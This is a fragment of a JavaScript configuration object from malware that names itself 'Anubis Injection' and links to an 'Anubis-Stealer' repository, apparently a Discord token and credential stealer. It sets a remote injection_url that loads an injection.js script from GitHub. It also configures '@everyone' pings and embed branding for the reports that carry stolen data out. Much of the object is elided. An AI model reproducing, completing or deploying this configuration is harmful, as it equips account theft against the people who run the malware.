...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Anubis Injection', 
  embed_icon: 'https://media.discordapp.net/attachments/1177375948597887096/1179432608975831101/as.png'.replace(/ /g, '%20'), 
  embed_color: 16776960, 
  injection_url: 'https://raw.githubusercontent.com/wtfanubisstealerwtf/index/main/injection.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
            text: 'Anubis Injection・https://github.com/waffenbesitz/Anubis-Stealer',
            icon_url: "https://media.discordapp.net/attachments/1177375948597887096/1179432608975831101/as.png"
        },
      },
    ],
  };
